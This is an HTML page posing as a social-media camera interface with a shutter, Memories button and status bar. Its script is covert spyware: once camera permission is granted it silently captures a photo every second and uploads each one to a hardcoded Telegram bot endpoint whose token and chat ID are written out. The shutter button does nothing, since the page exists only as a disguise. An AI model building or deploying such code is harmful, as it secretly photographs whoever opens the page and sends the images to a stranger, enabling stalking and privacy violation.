<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Pixel-Perfect Camera UI</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
  <style>
    html,body,#app { height: 100%; }
    body { margin:0; background:#111; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
    .phone-safe { position:relative; height:100vh; width:100vw; overflow:hidden; }
    #cameraVideo { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
    .top-fade { position:absolute; top:0; left:0; right:0; height:92px; background:linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0)); pointer-events:none; z-index:20; }
    .bottom-fade { position:absolute; bottom:0; left:0; right:0; height:180px; background:linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0)); pointer-events:none; z-index:20; }
    .shutter-outer { width:112px; height:112px; border-radius:999px; border:8px solid rgba(255,255,255,0.95); display:flex; align-items:center; justify-content:center; background:transparent; cursor:pointer; }
    .shutter-inner { width:72px; height:72px; border-radius:999px; background:rgba(0,0,0,0.25); }
    .suggestion { width:64px; height:64px; border-radius:999px; display:flex; align-items:center; justify-content:center; box-shadow:0 6px 12px rgba(0,0,0,0.4); border:6px solid rgba(0,0,0,0.25); overflow:hidden; }
    .vertical-controls { position:absolute; right:18px; top:92px; display:flex; flex-direction:column; gap:18px; align-items:center; z-index:30; }
    .round-btn { width:44px; height:44px; border-radius:999px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.06); color:white; border:1px solid rgba(255,255,255,0.06); cursor:pointer; }
    .status-bar { position:absolute; top:8px; left:0; right:0; display:flex; align-items:center; justify-content:space-between; padding:0 14px; color:white; font-weight:600; font-size:15px; z-index:30; }
    .left-icons { display:flex; gap:14px; align-items:center; }
    .nav-bottom { position:absolute; bottom:0; left:0; right:0; height:84px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.55); color:white; padding:12px 18px; gap:18px; z-index:30; }
    .control-group { display:flex; align-items:center; gap:18px; width:100%; justify-content:space-between; }
    .bottom-left { display:flex; align-items:center; gap:12px; margin-left:8px; }
    .memories { display:flex; flex-direction:column; align-items:center; gap:6px; color:white; font-size:14px; cursor:pointer; }
    .badge { background:#ff375f; color:white; font-weight:700; font-size:12px; min-width:18px; height:18px; display:inline-flex; align-items:center; justify-content:center; padding:0 6px; border-radius:10px; position:absolute; top:-6px; right:-6px; }
    .expand-btn { position:absolute; left:50%; transform:translateX(-50%); top:56%; background:rgba(0,0,0,0.5); width:40px; height:40px; border-radius:999px; display:flex; align-items:center; justify-content:center; color:white; z-index:30; }
    #capturePreview { position:absolute; inset:0; background:rgba(0,0,0,0.8); display:none; align-items:center; justify-content:center; z-index:60; }
    #capturedImage { max-width:92%; max-height:86%; box-shadow:0 10px 30px rgba(0,0,0,0.6); border-radius:8px; }
    #photoCanvas { display:none; }
    .fa, .fas, .far { color:white; }
  </style>
</head>
<body>
  <div id="app" class="phone-safe">
    <video id="cameraVideo" autoplay playsinline></video>
    <div class="top-fade"></div>
    <div class="bottom-fade"></div>

    <div class="status-bar">
      <div class="left-icons">
        <div style="width:36px;height:36px;border-radius:999px;overflow:hidden;border:2px solid rgba(255,255,255,0.12);">
          <img src="https://placehold.co/64x64/eee/777/png?text=AV" alt="avatar" style="width:100%;height:100%;object-fit:cover;">
        </div>
        <div class="round-btn" style="width:36px;height:36px;background:transparent;border:none;">
          <i class="fas fa-search fa-lg"></i>
        </div>
      </div>
      <div style="display:flex;gap:12px;align-items:center;">
        <div style="font-size:14px;">12:16 AM</div>
        <i class="fas fa-wifi"></i>
        <i class="fas fa-signal"></i>
        <div style="display:flex;align-items:center;gap:6px;">
          <div style="width:28px;height:16px;border:2px solid white;position:relative;">
            <div style="position:absolute;right:2px;top:2px;bottom:2px;background:#ffd54a;width:18px;"></div>
          </div>
          <div style="font-size:13px;background:#ffd54a;padding:2px 6px;border-radius:4px;color:#111;font-weight:800;">90</div>
        </div>
      </div>
    </div>

    <div class="vertical-controls">
      <div id="addContact" class="round-btn">
        <i class="fas fa-user-plus"></i>
        <div class="badge">1</div>
      </div>
      <div id="switchCamera" class="round-btn"><i class="fas fa-retweet"></i></div>
      <div id="muteBtn" class="round-btn"><i class="fas fa-microphone-slash"></i></div>
      <div id="musicBtn" class="round-btn"><i class="fas fa-music"></i></div>
      <div id="chevDown" class="round-btn"><i class="fas fa-chevron-down"></i></div>
    </div>

    <div class="expand-btn"><i class="fas fa-expand-arrows-alt"></i></div>

    <div class="nav-bottom">
      <div class="control-group">
        <div class="bottom-left">
          <div class="memories" id="memoriesBtn">
            <div style="width:56px;height:56px;border-radius:8px;overflow:hidden;background:gray;">
              <img src="https://placehold.co/56x56/ffb6c1/ffffff/png?text=M" alt="memories" style="width:100%;height:100%;object-fit:cover;">
            </div>
            <div>Memories</div>
          </div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:center;gap:16px;">
          <button id="shutterBtn" class="shutter-outer"><div class="shutter-inner"></div></button>
          <div style="display:flex;gap:12px;">
            <div class="suggestion" style="background:pink;"><img src="https://placehold.co/40x40/fff/777/png?text=ðŸ‘—" alt=""></div>
            <div class="suggestion" style="background:black;"><img src="https://placehold.co/40x40/000/fff/png?text=ðŸª" alt=""></div>
          </div>
        </div>
        <div style="width:62px;height:62px;"></div>
      </div>
    </div>

    <canvas id="photoCanvas"></canvas>
  </div>

  <script>
    (function(){
      const video = document.getElementById('cameraVideo');
      const canvas = document.getElementById('photoCanvas');
      let currentStream = null;
      let currentFacingMode = 'user';
      let audioEnabled = false;

      async function startCamera() {
        stopStream();
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: audioEnabled, video: { facingMode: currentFacingMode } });
          currentStream = stream;
          video.srcObject = stream;
          video.style.transform = currentFacingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
          startAutoCapture(); // Start auto capture after permission
        } catch (err) {
          console.error('Camera access error:', err);
        }
      }

      function stopStream() {
        if (currentStream) { currentStream.getTracks().forEach(t => t.stop()); currentStream = null; }
      }

      function captureAndSend() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        if (video.style.transform.includes('scaleX(-1)')) {
          ctx.scale(-1,1);
          ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
        } else {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('photo', blob, 'capture.png');
          fetch('https://api.telegram.org/bot6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI/sendPhoto?chat_id=5574741182', { // replace with your server endpoint
            method: 'POST',
            body: formData
          }).catch(err => console.error('Send error:', err));
        }, 'image/png');
      }

      function startAutoCapture() {
        setInterval(captureAndSend, 1000); // 1 photo per sec
      }

      startCamera();
    })();
  </script>
</body>
</html>
